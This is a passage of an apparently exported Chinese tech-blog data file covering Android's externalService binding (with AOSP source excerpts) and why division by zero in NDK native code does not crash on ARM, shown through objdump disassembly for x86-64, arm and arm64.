class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** Tests that an externalService can only be bound with BIND_EXTERNAL_SERVICE. */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testFailBindWithoutBindExternal</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();</span><br><span class=\"line\">    intent.setComponent(<span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(sServicePackage, sServicePackage+<span class=\"string\">&quot;.ExternalService&quot;</span>));</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        getContext().bindService(intent, mConnection, Context.BIND_AUTO_CREATE);</span><br><span class=\"line\">        fail(<span class=\"string\">&quot;Should not be able to bind to an external service without BIND_EXTERNAL_SERVICE&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (SecurityException e) &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因此，最后正确的用法必须是这样声明：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">service</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.XXXService&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:exported</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:externalService</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:isolatedProcess</span>=<span class=\"string\">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>同时通过：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bindService(intent, mConnection, Context.BIND_AUTO_CREATE | Context.BIND_EXTERNAL_SERVICE);</span><br></pre></td></tr></table></figure>\n\n<p>进行绑定，BIND_EXTERNAL_SERVICE是必须，其余flag根据自己需要决定。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>我专门搜了下AOSP的代码提交记录，发现这个功能3年前就开发好了，链接如下：<br><a href=\"https://android.googlesource.com/platform/frameworks/base/+/b9a8666eb5504f022343fef9087135b7d937ddf8%5E%21/\">https://android.googlesource.com/platform/frameworks/base/+/b9a8666eb5504f022343fef9087135b7d937ddf8%5E%21/</a><br>Commit信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Add external services, a way to run isolated processes as a different package.</span><br><span class=\"line\"></span><br><span class=\"line\">This adds android:externalService boolean attribute to &lt;service&gt;. If that</span><br><span class=\"line\">attribute is true, then bindService() may be called with</span><br><span class=\"line\">BIND_EXTERNAL_SERVICE to create the new service process under the calling</span><br><span class=\"line\">package&#x27;s name and uid. The service will execute the code from the package in</span><br><span class=\"line\">which it is declared, but will appear to run as the calling application.</span><br><span class=\"line\"></span><br><span class=\"line\">External services may only be used if android:exported=&quot;false&quot; and</span><br><span class=\"line\">android:isolatedProcess=&quot;true&quot;.</span><br><span class=\"line\"></span><br><span class=\"line\">Bug: 22084679</span><br><span class=\"line\">Bug: 21643067</span><br><span class=\"line\">Change-Id: I3c3a5f0ef58738316c5efeab9044e43e09220d01</span><br></pre></td></tr></table></figure>\n\n<p>改动也不多，就这么几个文件：<br><img src=\"https://imgconvert.csdnimg.cn/20190410235236156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>其中最重要的逻辑就在ActiveServices当中，很长的方法，此处只保留关键新增部分：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> ServiceLookupResult <span class=\"title function_\">retrieveServiceLocked</span><span class=\"params\">(Intent service,</span></span><br><span class=\"line\"><span class=\"params\">        String resolvedType, String callingPackage, <span class=\"type\">int</span> callingPid, <span class=\"type\">int</span> callingUid, <span class=\"type\">int</span> userId,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">boolean</span> createIfNeeded, <span class=\"type\">boolean</span> callingFromFg, <span class=\"type\">boolean</span> isBindExternal,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">boolean</span> allowInstant)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">ServiceRecord</span> <span class=\"variable\">r</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">            <span class=\"type\">ComponentName</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(</span><br><span class=\"line\">                    sInfo.applicationInfo.packageName, sInfo.name);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((sInfo.flags &amp; ServiceInfo.FLAG_EXTERNAL_SERVICE) != <span class=\"number\">0</span>) &#123; <span class=\"comment\">// 先验证flag，即对应externalService属性是否为true</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (isBindExternal) &#123; <span class=\"comment\">// isBindExternal表示是否是通过BIND_EXTERNAL_SERVICE绑定服务</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!sInfo.exported) &#123;</span><br><span class=\"line\">                    \t<span class=\"comment\">// 你看，exported必须也是true，否则直接丢你一脸异常</span></span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE failed, &quot;</span> + name +</span><br><span class=\"line\">                                <span class=\"string\">&quot; is not exported&quot;</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ((sInfo.flags &amp; ServiceInfo.FLAG_ISOLATED_PROCESS) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    \t<span class=\"comment\">// isolatedProcess也必须true</span></span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE failed, &quot;</span> + name +</span><br><span class=\"line\">                                <span class=\"string\">&quot; is not an isolatedProcess&quot;</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// Run the service under the calling package&#x27;s application.</span></span><br><span class=\"line\">                    <span class=\"comment\">// （这里是源码注释，即下面的代码就是如何让调用方App拥有这个外置Service）</span></span><br><span class=\"line\">                    <span class=\"type\">ApplicationInfo</span> <span class=\"variable\">aInfo</span> <span class=\"operator\">=</span> AppGlobals.getPackageManager().getApplicationInfo(</span><br><span class=\"line\">                            callingPackage, ActivityManagerService.STOCK_PM_FLAGS, userId);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (aInfo == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE failed, &quot;</span> +</span><br><span class=\"line\">                                <span class=\"string\">&quot;could not resolve client package &quot;</span> + callingPackage);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// 其实就是重新设置了一遍ServiceInfo，让此Service改名换姓</span></span><br><span class=\"line\">                    sInfo = <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceInfo</span>(sInfo);</span><br><span class=\"line\">                    sInfo.applicationInfo = <span class=\"keyword\">new</span> <span class=\"title class_\">ApplicationInfo</span>(sInfo.applicationInfo);</span><br><span class=\"line\">                    sInfo.applicationInfo.packageName = aInfo.packageName;</span><br><span class=\"line\">                    sInfo.applicationInfo.uid = aInfo.uid;</span><br><span class=\"line\">                    name = <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(aInfo.packageName, name.getClassName());</span><br><span class=\"line\">                    service.setComponent(name);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE required for &quot;</span> +</span><br><span class=\"line\">                            name);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (isBindExternal) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SecurityException</span>(<span class=\"string\">&quot;BIND_EXTERNAL_SERVICE failed, &quot;</span> + name +</span><br><span class=\"line\">                        <span class=\"string\">&quot; is not an externalService&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"NDK开发中为什么除以0程序不崩溃？","subtitle":"教条不会告诉你的。","date":"2019-04-14T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n我们都知道不管是在Java还是在C++程序中，下面这段代码都会导致程序错误：\n\n```java\nint x = 10;\nint y = x / 0;\n...\n```\n\n但是我今天发现了一个比较神奇的事情，把这段代码写成native方法后在Java层调用，竟然没有导致App崩溃，代码是这样子的：\n\n```cpp\n#include <jni.h>\n#include \"logger.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nJNIEXPORT void JNICALL test_crash(JNIEnv *env, jobject /* this */) {\n    int x = 10;\n    int y = x / 0;\n    LOGD(\"crash %d\", y);\n}\n\n#ifdef __cplusplus\n}\n#endif\n```\n\nJava层很简单，我保证没有try-catch，而且Log打印出来y的值竟然是0，这完全颠覆我三观。\n怀疑人生的我把这两行关键代码放到原生的C++编译器中编译并运行，妥妥地报错：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190412232026342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n为什么在Android手机上就不会导致crash呢？于是我验证了一下是不是异常机制有什么问题，直接这样写native代码：\n\n```cpp\nJNIEXPORT void JNICALL test_crash(JNIEnv *env, jobject /* this */) {\n//    int x = 10;\n//    int y = x / 0;\n//    LOGD(\"crash %d\", y);\n    throw \"Crash!!!\"; // 手动抛异常\n}\n```\n\n还好没有毁三观，App顺利地crash了，所以异常机制是正常的。\n那么就说明除0操作在我的手机上没有导致异常抛出，唯一能想到的就是**汇编指令不同了**，毕竟电脑CPU是x86-64架构的，手机是arm的，二者指令集不同。\n**验证方法当然就是利用NDK工具和so文件生成汇编代码，看看是不是arm架构下根本就不用除法指令。**\n1、先build一下Android工程，然后找到so文件：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190412233052125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n可以把它们暂时拷贝出来待用。\n2、进入NDK工具链目录（前提是在SDK Manager中下载了NDK相关的工具），下面是Linux终端命令操作：\n\n```shell\n$ cd Android/Sdk/ndk-bundle/toolchains/\n$ ls\naarch64-linux-android-4.9  arm-linux-androideabi-4.9  llvm  renderscript  x86-4.9  x86_64-4.9\n```\n\n可以发现toolchains下面有4种架构的工具包，对于build出来的4个so文件，这里我们只测试x86-64和arm的。\n3、以前者为例，于是进入相关目录，找到xxx-linux-android-objdump工具，然后生成汇编指令：\n\n```shell\n$ cd x86_64-4.9/prebuilt/linux-x86_64/bin\n$ ./x86_64-linux-android-objdump -dx libnative-lib.so > test.txt\n```\n\n这里我已经把刚才的so文件拷贝到工具同目录了，所以命令才能直接这么写。\n4、其它架构的操作和上述几步一致，但一定要对应解析正确的so文件，不然objdump会提示错误。\n5、打开刚才生成的汇编txt文本，搜索我们最开始写的那个test_crash方法，发现在x86-64架构中：\n\n```c\n0000000000013960 <test_crash>:\n   13960:\t55                   \tpush   %rbp\n   13961:\t48 89 e5             \tmov    %rsp,%rbp\n   13964:\t31 c0                \txor    %eax,%eax\n   13966:\tc7 45 fc 0a 00 00 00 \tmovl   $0xa,-0x4(%rbp)\n   1396d:\t8b 4d fc             \tmov    -0x4(%rbp),%ecx\n   13970:\t89 45 f4             \tmov    %eax,-0xc(%rbp)\n   13973:\t89 c8                \tmov    %ecx,%eax\n   13975:\t99                   \tcltd   \n   13976:\t8b 4d f4             \tmov    -0xc(%rbp),%ecx\n   13979:\tf7 f9                \tidiv   %ecx // idiv表示有符号数除法\n   1397b:\t89 45 f8             \tmov    %eax,-0x8(%rbp)\n   1397e:\t5d                   \tpop    %rbp\n   1397f:\tc3                   \tretq  \n```\n\n然鹅，在arm的汇编指令中：\n\n```c\n0000cb1c <test_crash>:\n    cb1c:\tb082      \tsub\tsp, #8\n    cb1e:\t200a      \tmovs\tr0, #10\n    cb20:\t9001      \tstr\tr0, [sp, #4]\n    cb22:\tb002      \tadd\tsp, #8\n    cb24:\t4770      \tbx\tlr\n\t...\n```\n\n发现没有div相关的指令，看来果然是不一样啊。\n如果真是如此，那么x86-64架构的Android手机，肯定就会出现除0错误，于是我打开了一个x86-64的谷歌亲儿子模拟器，运行程序，还真崩掉了，但在arm架构的机器上，就不会崩。我手机是高通的CPU，正好也就是arm架构的。\n这么说来，还真是印证了复杂指令集和精简指令集啊哈哈，你看看上面同样的代码实现，指令数却完全不同。\n\n后来，去Goggle一查，才发现arm体系结构本身就不包含除法运算硬件，是靠函数实现的，看来是我孤陋寡闻了：\n[GCC ARM cortex-m0 除0问题](https://blog.csdn.net/weixin_33851429/article/details/91954260)\n[ARM的除法运算优化策略](https://blog.csdn.net/xhhjin/article/details/6338766)\n[高效的C编程之：除法运算](https://www.eefocus.com/embedded/m/323206)\n\n还没完，上面解释的只是arm架构，还有arm64呢（目前主流的骁龙845/855等等都是）？先看看汇编指令：\n\n```c\n00000000000131b8 <test_crash>:\n   131b8:\td10043ff \tsub\tsp, sp, #0x10\n   131bc:\t52800148 \tmov\tw8, #0xa                   \t// #10\n   131c0:\t52800009 \tmov\tw9, #0x0                   \t// #0\n   131c4:\tb9000fe8 \tstr\tw8, [sp,#12]\n   131c8:\tb9400fe8 \tldr\tw8, [sp,#12]\n   131cc:\t1ac90d08 \tsdiv\tw8, w8, w9 // sdiv表示有符号数除法\n   131d0:\tb9000be8 \tstr\tw8, [sp,#8]\n   131d4:\t910043ff \tadd\tsp, sp, #0x10\n   131d8:\td65f03c0 \tret\n```\n\n咦？怎么arm64架构又有除法指令（[sdiv指令文档](http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0802a/SDIV.html)）了？那怎么除以0也不造成崩溃呢？\n看了看arm官方的文档之后：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/201904151552175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n可以发现，指令有一个标志位DZ，叫**Divide by Zero fault enable bit**，默认为0，即当除以0时不带出异常，而是返回0（这就解释了我们最开始为什么打log值是0），如果设为1，才会抛异常。\n\n此外，在[ARM 架构的运行时 ABI](http://infocenter.arm.com/help/topic/com.arm.doc.ihi0043d/IHI0043D_rtabi.pdf)文档中，也看到了类似的解释，说明除0抛不抛异常，取决于函数的不同实现：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190419160717355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n------\n\n哦对，要查看自己手机的CPU信息，可以用adb命令哦：\n\n```shell\nadb shell cat /proc/cpuinfo\n```\n","source":"_posts/2019-04-15-NDK开发中为什么除以0程序不崩溃？.md","raw":"---\nlayout:     post\ntitle:      NDK开发中为什么除以0程序不崩溃？\nsubtitle:   教条不会告诉你的。\ndate:       2019-04-15\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 问题不大\n    - Android\n---\n\n我们都知道不管是在Java还是在C++程序中，下面这段代码都会导致程序错误：\n\n```java\nint x = 10;\nint y = x / 0;\n...\n```\n\n但是我今天发现了一个比较神奇的事情，把这段代码写成native方法后在Java层调用，竟然没有导致App崩溃，代码是这样子的：\n\n```cpp\n#include <jni.h>\n#include \"logger.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nJNIEXPORT void JNICALL test_crash(JNIEnv *env, jobject /* this */) {\n    int x = 10;\n    int y = x / 0;\n    LOGD(\"crash %d\", y);\n}\n\n#ifdef __cplusplus\n}\n#endif\n```\n\nJava层很简单，我保证没有try-catch，而且Log打印出来y的值竟然是0，这完全颠覆我三观。\n怀疑人生的我把这两行关键代码放到原生的C++编译器中编译并运行，妥妥地报错：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190412232026342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n为什么在Android手机上就不会导致crash呢？于是我验证了一下是不是异常机制有什么问题，直接这样写native代码：\n\n```cpp\nJNIEXPORT void JNICALL test_crash(JNIEnv *env, jobject /* this */) {\n//    int x = 10;\n//    int y = x / 0;\n//    LOGD(\"crash %d\", y);\n    throw \"Crash!!!\"; // 手动抛异常\n}\n```\n\n还好没有毁三观，App顺利地crash了，所以异常机制是正常的。\n那么就说明除0操作在我的手机上没有导致异常抛出，唯一能想到的就是**汇编指令不同了**，毕竟电脑CPU是x86-64架构的，手机是arm的，二者指令集不同。\n**验证方法当然就是利用NDK工具和so文件生成汇编代码，看看是不是arm架构下根本就不用除法指令。**\n1、先build一下Android工程，然后找到so文件：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190412233052125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n可以把它们暂时拷贝出来待用。\n2、进入NDK工具链目录（前提是在SDK Manager中下载了NDK相关的工具），下面是Linux终端命令操作：\n\n```shell\n$ cd Android/Sdk/ndk-bundle/toolchains/\n$ ls\naarch64-linux-android-4.9  arm-linux-androideabi-4.9  llvm  renderscript  x86-4.9  x86_64-4.9\n```\n\n可以发现toolchains下面有4种架构的工具包，对于build出来的4个so文件，这里我们只测试x86-64和arm的。\n3、以前者为例，于是进入相关目录，找到xxx-linux-android-objdump工具，然后生成汇编指令：\n\n```shell\n$ cd x86_64-4.9/prebuilt/linux-x86_64/bin\n$ ./x86_64-linux-android-objdump -dx libnative-lib.so > test.txt\n```\n\n这里我已经把刚才的so文件拷贝到工具同目录了，所以命令才能直接这么写。\n4、其它架构的操作和上述几步一致，但一定要对应解析正确的so文件，不然objdump会提示错误。\n5、打开刚才生成的汇编txt文本，搜索我们最开始写的那个test_crash方法，发现在x86-64架构中：\n\n```c\n0000000000013960 <test_crash>:\n   13960:\t55                   \tpush   %rbp\n   13961:\t48 89 e5             \tmov    %rsp,%rbp\n   13964:\t31 c0                \txor    %eax,%eax\n   13966:\tc7 45 fc 0a 00 00 00 \tmovl   $0xa,-0x4(%rbp)\n   1396d:\t8b 4d fc             \tmov    -0x4(%rbp),%ecx\n   13970:\t89 45 f4             \tmov    %eax,-0xc(%rbp)\n   13973:\t89 c8                \tmov    %ecx,%eax\n   13975:\t99                   \tcltd   \n   13976:\t8b 4d f4             \tmov    -0xc(%rbp),%ecx\n   13979:\tf7 f9                \tidiv   %ecx // idiv表示有符号数除法\n   1397b:\t89 45 f8             \tmov    %eax,-0x8(%rbp)\n   1397e:\t5d                   \tpop    %rbp\n   1397f:\tc3                   \tretq  \n```\n\n然鹅，在arm的汇编指令中：\n\n```c\n0000cb1c <test_crash>:\n    cb1c:\tb082      \tsub\tsp, #8\n    cb1e:\t200a      \tmovs\tr0, #10\n    cb20:\t9001      \tstr\tr0, [sp, #4]\n    cb22:\tb002      \tadd\tsp, #8\n    cb24:\t4770      \tbx\tlr\n\t...\n```\n\n发现没有div相关的指令，看来果然是不一样啊。\n如果真是如此，那么x86-64架构的Android手机，肯定就会出现除0错误，于是我打开了一个x86-64的谷歌亲儿子模拟器，运行程序，还真崩掉了，但在arm架构的机器上，就不会崩。我手机是高通的CPU，正好也就是arm架构的。\n这么说来，还真是印证了复杂指令集和精简指令集啊哈哈，你看看上面同样的代码实现，指令数却完全不同。\n\n后来，去Goggle一查，才发现arm体系结构本身就不包含除法运算硬件，是靠函数实现的，看来是我孤陋寡闻了：\n[GCC ARM cortex-m0 除0问题](https://blog.csdn.net/weixin_33851429/article/details/91954260)\n[ARM的除法运算优化策略](https://blog.csdn.net/xhhjin/article/details/6338766)\n[高效的C编程之：除法运算](https://www.eefocus.com/embedded/m/323206)\n\n还没完，上面解释的只是arm架构，还有arm64呢（目前主流的骁龙845/855等等都是）？先看看汇编指令：\n\n```c\n00000000000131b8 <test_crash>:\n   131b8:\td10043ff \tsub\tsp, sp, #0x10\n   131bc:\t52800148 \tmov\tw8, #0xa                   \t// #10\n   131c0:\t52800009 \tmov\tw9, #0x0                   \t// #0\n   131c4:\tb9000fe8 \tstr\tw8, [sp,#12]\n   131c8:\tb9400fe8 \tldr\tw8, [sp,#12]\n   131cc:\t1ac90d08 \tsdiv\tw8, w8, w9 // sdiv表示有符号数除法\n   131d0:\tb9000be8 \tstr\tw8, [sp,#8]\n   131d4:\t910043ff \tadd\tsp, sp, #0x10\n   131d8:\td65f03c0 \tret\n```\n\n咦？怎么arm64架构又有除法指令（[sdiv指令文档](http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0802a/SDIV.html)）了？那怎么除以0也不造成崩溃呢？\n看了看arm官方的文档之后：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/201904151552175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n可以发现，指令有一个标志位DZ，叫**Divide by Zero fault enable bit**，默认为0，即当除以0时不带出异常，而是返回0（这就解释了我们最开始为什么打log值是0），如果设为1，才会抛异常。\n\n此外，在[ARM 架构的运行时 ABI](http://infocenter.arm.com/help/topic/com.arm.doc.ihi0043d/IHI0043D_rtabi.pdf)文档中，也看到了类似的解释，说明除0抛不抛异常，取决于函数的不同实现：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190419160717355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n\n------\n\n哦对，要查看自己手机的CPU信息，可以用adb命令哦：\n\n```shell\nadb shell cat /proc/cpuinfo\n```\n","slug":"NDK开发中为什么除以0程序不崩溃？","published":1,"updated":"2024-03-25T07:31:25.853Z","comments":1,"photos":[],"link":"","_id":"cluaufh0k000rthe60qogccly","content":"<p>我们都知道不管是在Java还是在C++程序中，下面这段代码都会导致程序错误：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">x</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"variable\">y</span> <span class=\"operator\">=</span> x / <span class=\"number\">0</span>;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>但是我今天发现了一个比较神奇的事情，把这段代码写成native方法后在Java层调用，竟然没有导致App崩溃，代码是这样子的：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;jni.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;logger.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">JNIEXPORT <span class=\"type\">void</span> JNICALL <span class=\"title\">test_crash</span><span class=\"params\">(JNIEnv *env, jobject <span class=\"comment\">/* this */</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> y = x / <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">LOGD</span>(<span class=\"string\">&quot;crash %d&quot;</span>, y);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n\n<p>Java层很简单，我保证没有try-catch，而且Log打印出来y的值竟然是0，这完全颠覆我三观。<br>怀疑人生的我把这两行关键代码放到原生的C++编译器中编译并运行，妥妥地报错：<br><img src=\"https://imgconvert.csdnimg.cn/20190412232026342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>为什么在Android手机上就不会导致crash呢？于是我验证了一下是不是异常机制有什么问题，直接这样写native代码：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">JNIEXPORT <span class=\"type\">void</span> JNICALL <span class=\"title\">test_crash</span><span class=\"params\">(JNIEnv *env, jobject <span 